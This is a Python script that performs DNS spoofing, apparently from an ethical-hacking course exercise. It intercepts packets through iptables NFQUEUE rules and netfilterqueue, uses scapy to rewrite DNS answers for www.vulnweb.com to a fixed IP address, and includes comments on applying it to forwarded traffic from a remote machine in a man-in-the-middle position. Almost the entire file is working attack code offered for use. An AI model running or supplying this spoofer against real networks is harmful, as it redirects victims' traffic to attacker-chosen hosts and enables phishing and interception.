#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0      run this to store packets in a queue for remote machine

# iptables -I OUTPUT -j NFQUEUE --queue-num 0      run this to store packets in a queue for local machine
# iptables -I INPUT -j NFQUEUE --queue-num 0      run this to store packets in a queue for local machine

# pip install netfilterqueue
# after flush the iptables :- iptables --flush
import netfilterqueue
import subprocess
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.vulnweb.com" in qname:
            print("[+] spoofed")
            answer = scapy.DNSRR(rrname=qname, rdata="172.217.194.106")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()



try:
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] deleting ip tables")
    subprocess.call("iptables --flush", shell=True)
